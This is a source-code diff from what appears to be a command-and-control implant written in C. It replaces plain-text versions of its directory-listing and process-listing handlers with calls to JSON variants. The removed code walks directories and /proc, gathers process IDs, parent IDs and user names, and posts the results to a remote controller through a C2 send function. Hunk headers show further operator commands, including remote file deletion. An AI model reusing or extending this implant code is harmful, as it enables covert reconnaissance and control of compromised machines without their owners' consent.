@@ -166,32 +166,7 @@ void cmd_pwd(uint32_t req_id) {
 }
 
 void cmd_ls(uint32_t req_id, const char* path) {
-    DIR* dir = opendir(path);
-    if (!dir) {
-        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to open directory");
-        g_c2_post(pkt->data, pkt->size, NULL, NULL);
-        buf_free(pkt);
-        return;
-    }
-
-    char* listing = NULL;
-    size_t listing_len = 0;
-    struct dirent* entry;
-
-    while ((entry = readdir(dir)) != NULL) {
-        size_t l = strlen(entry->d_name);
-        listing = realloc(listing, listing_len + l + 2);
-        memcpy(listing + listing_len, entry->d_name, l);
-        listing_len += l;
-        listing[listing_len++] = '\n';
-        listing[listing_len] = '\0';
-    }
-    closedir(dir);
-
-    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, listing ? listing : "");
-    g_c2_post(pkt->data, pkt->size, NULL, NULL);
-    buf_free(pkt);
-    free(listing);
+    cmd_ls_json(req_id, path);
 }
 
 static char* json_escape(const char* s) {
@@ -560,63 +535,7 @@ void cmd_rm(uint32_t req_id, const char* path, int recursive) {
 }
 
 void cmd_ps(uint32_t req_id) {
-    DIR* dir = opendir("/proc");
-    if (!dir) {
-        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to open /proc");
-        g_c2_post(pkt->data, pkt->size, NULL, NULL);
-        buf_free(pkt);
-        return;
-    }
-    char* out = NULL;
-    size_t out_len = 0;
-    const char* hdr = "PID        PPID       USER            COMMAND\n";
-    size_t hlen = strlen(hdr);
-    out = realloc(out, hlen + 1);
-    memcpy(out, hdr, hlen + 1);
-    out_len = hlen;
-
-    struct dirent* ent;
-    while ((ent = readdir(dir)) != NULL) {
-        char* endptr;
-        long pid = strtol(ent->d_name, &endptr, 10);
-        if (*endptr != '\0' || pid <= 0) continue;
-
-        char status_path[64];
-        snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
-        FILE* f = fopen(status_path, "r");
-        if (!f) continue;
-
-        char name[256] = "";
-        char ppid_str[32] = "";
-        char uid_str[32] = "";
-        char line[256];
-        while (fgets(line, sizeof(line), f)) {
-            if      (strncmp(line, "Name:", 5) == 0) sscanf(line + 5, " %255s", name);
-            else if (strncmp(line, "PPid:", 5) == 0) sscanf(line + 5, " %31s",  ppid_str);
-            else if (strncmp(line, "Uid:",  4) == 0) {
-                int ruid = 0;
-                sscanf(line + 4, " %d", &ruid);
-                struct passwd* pw = getpwuid((uid_t)ruid);
-                if (pw) strncpy(uid_str, pw->pw_name, sizeof(uid_str) - 1);
-                else    snprintf(uid_str, sizeof(uid_str), "%d", ruid);
-            }
-        }
-        fclose(f);
-
-        char entry[512];
-        int elen = snprintf(entry, sizeof(entry), "%-10ld %-10s %-15s %s\n", pid, ppid_str, uid_str, name);
-        if (elen < 1) continue;
-        out = realloc(out, out_len + elen + 1);
-        memcpy(out + out_len, entry, elen);
-        out_len += elen;
-        out[out_len] = '\0';
-    }
-    closedir(dir);
-
-    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
-    g_c2_post(pkt->data, pkt->size, NULL, NULL);
-    buf_free(pkt);
-    free(out);
+    cmd_ps_json(req_id);
 }
 
 void cmd_id(uint32_t req_id) {
